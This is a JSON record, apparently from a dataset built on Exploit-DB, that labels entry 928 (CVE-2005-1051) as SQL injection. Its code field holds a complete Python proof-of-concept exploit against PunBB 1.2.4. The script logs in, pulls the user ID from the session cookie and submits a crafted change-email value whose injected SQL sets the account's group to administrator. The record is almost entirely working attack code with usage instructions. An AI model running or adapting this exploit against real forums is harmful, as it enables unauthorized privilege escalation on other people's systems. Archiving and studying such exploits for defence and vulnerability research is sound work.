{
  "id": "928",
  "title": "PunBB 1.2.4 - &#039;id&#039; SQL Injection",
  "cve": "CVE-2005-1051",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/python\r\n#######################################################################\r\n#  _  _                _                     _       ___  _  _  ___\r\n# | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \\| || || _ \\\r\n# | __ |/ _` || '_|/ _` |/ -_)| ' \\ / -_)/ _` ||___||  _/| __ ||  _/\r\n# |_||_|\\__,_||_|  \\__,_|\\___||_||_|\\___|\\__,_|     |_|  |_||_||_|\r\n#\r\n#######################################################################\r\n#         Proof of concept code from the Hardened-PHP Project\r\n#######################################################################\r\n#\r\n#                           -= PunBB 1.2.4 =-\r\n#                   change_email SQL injection exploit\r\n#\r\n#  user-supplied data within the database is still user-supplied data\r\n#\r\n#######################################################################\r\n\r\nimport urllib\r\nimport getopt\r\nimport sys\r\nimport string\r\n\r\n__argv__ = sys.argv\r\n\r\ndef banner():\r\n   print \"PunBB 1.2.4 - change_email SQL injection exploit\"\r\n   print \"Copyright (C) 2005 Hardened-PHP Project\\n\"\r\n\r\ndef usage():\r\n   banner()\r\n   print \"Usage:\\n\"\r\n   print \"   $ ./punbb_change_email.py [options]\\n\"\r\n   print \"        -h http_url   url of the punBB forum to exploit\"\r\n   print \"                      f.e. http://www.forum.net/punBB/\"\r\n   print \"        -u username   punBB forum useraccount\"\r\n   print \"        -p password   punBB forum userpassword\"\r\n   print \"        -e email      email address where the admin leve activation email is sent\"\r\n   print \"        -d domain     catch all domain to catch \\\"some-SQL-Query\\\"@domain emails\"\r\n   print \"\"\r\n   sys.exit(-1)\r\n\r\ndef main():\r\n   try:\r\n       opts, args = getopt.getopt(sys.argv[1:], \"h:u:p:e:d:\")\r\n   except getopt.GetoptError:\r\n       usage()\r\n\r\n   if len(__argv__) < 10:\r\n       usage()\r\n\r\n   username = None\r\n   password = None\r\n   email = None\r\n   domain = None\r\n   host = None\r\n   for o, arg in opts:\r\n       if o == \"-h\":\r\n           host = arg\r\n       if o == \"-u\":\r\n           username = arg\r\n       if o == \"-p\":\r\n           password = arg\r\n       if o == \"-e\":\r\n           email = arg\r\n       if o == \"-d\":\r\n           domain = arg\r\n\r\n   # Printout banner\r\n   banner()\r\n\r\n   # Check if everything we need is there\r\n   if host == None:\r\n       print \"[-] need a host to connect to\"\r\n       sys.exit(-1)\r\n   if username == None:\r\n       print \"[-] username needed to continue\"\r\n       sys.exit(-1)\r\n   if password == None:\r\n       print \"[-] password needed to continue\"\r\n       sys.exit(-1)\r\n   if email == None:\r\n       print \"[-] email address needed to continue\"\r\n       sys.exit(-1)\r\n   if domain == None:\r\n       print \"[-] catch all domain needed to continue\"\r\n       sys.exit(-1)\r\n\r\n   # Retrive cookie\r\n   params = {\r\n       'req_username' : username,\r\n       'req_password' : password,\r\n       'form_sent' : 1\r\n   }\r\n\r\n   wclient = urllib.URLopener()\r\n\r\n   print \"[+] Connecting to retrieve cookie\"\r\n\r\n   req = wclient.open(host + \"/login.php?action=in\", urllib.urlencode(params))\r\n   info = req.info()\r\n   if 'set-cookie' not in info:\r\n       print \"[-] Unable to retrieve cookie... something is wrong\"\r\n       sys.exit(-3)\r\n   cookie = info['set-cookie']\r\n   cookie = cookie[:string.find(cookie, ';')]\r\n   print \"[+] Cookie found - extracting user_id\"\r\n   user_id = cookie[string.find(cookie, \"%3A%22\")+6:string.find(cookie, \"%22%3B\")]\r\n   print \"[+] User-ID: %d\" % (int(user_id))\r\n   wclient.addheader('Cookie', cookie);\r\n\r\n   email = '\"' + email[:string.find(email, '@')] + '\"@' + email[string.find(email, '@')+1:] + ',\"\\','\r\n   append = 'group_id=\\'1'\r\n   email = email + ( ((50-len(append))-len(email)) * ' ' ) + append + '\"@' + domain\r\n\r\n   params = {\r\n       'req_new_email' : email,\r\n       'form_sent' : 1\r\n   }\r\n\r\n   print \"[+] Connecting to request change email\"\r\n   req = wclient.open(host + \"profile.php?action=change_email&id=\" + user_id, urllib.urlencode(params))\r\n\r\n   print \"[+] Done... Now wait for the email. Log into punBB, go to the link in the email and become admin\"\r\n\r\nif __name__ == \"__main__\":\r\n   main()\r\n\r\n# milw0rm.com [2005-04-11]",
  "url": "https://www.exploit-db.com/exploits/928"
}